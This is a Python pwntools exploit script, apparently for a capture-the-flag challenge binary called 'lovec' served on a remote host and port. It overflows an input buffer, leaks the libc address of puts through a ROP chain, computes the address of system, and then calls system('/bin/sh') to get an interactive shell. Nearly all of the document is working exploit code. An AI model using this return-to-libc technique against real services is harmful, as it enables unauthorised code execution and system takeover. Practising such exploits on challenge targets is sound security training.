from pwn import *
import time, sys

# local process envirnoment
LOCAL = False
elf_name = "./lovec"

#retmote args
remote_host = "140.113.209.24"
remote_port = 11003
context.clear(arch="amd64")
elf = ELF(elf_name)

if LOCAL:
    puts_off = 0x05FCA0
    system_off = 0x3ADA0
    context.log_level = "debug"
    mine_env = os.environ
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    #context.log_level = "debug"
    puts_off = 0x65650
    system_off = 0x40190
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.05)

def cons_vuln():
    io.recvuntil("Please enter your name:")
    payload = 'a' + chr(0) + "/bin/sh"
    payload = payload.ljust(20, chr(0))
    payload +=  chr(0xFF)
    dlySend(payload)
    io.recvuntil("10. C")
    io.sendline(str(10))
    io.recvuntil("did you like it?")

def s_exp():
    main_addr = 0x8048588
    name_addr = 0x804A048
    cons_vuln()
    payload = 'c'*0x1d + p32(0)*2 + p32(1)
    payload += p32(elf.plt['puts'])
    payload += p32(main_addr)
    payload += p32(elf.got['puts'])
    dlySend(payload)
    io.recvuntil("a nice day!\n")
    data = io.recv(4)
    puts_addr = u32(data.ljust(4, chr(0)))
    libc_addr = puts_addr - puts_off
    system_addr = libc_addr + system_off
    log.info("libc address: "+hex(libc_addr))
    cons_vuln()
    payload = 'c'*0x1d + p32(1)
    payload += p32(system_addr)
    payload += p32(main_addr)
    payload += p32(name_addr+2)
    pause()
    dlySend(payload)
    io.interactive()

if __name__ == "__main__":
    s_exp()
    pause()
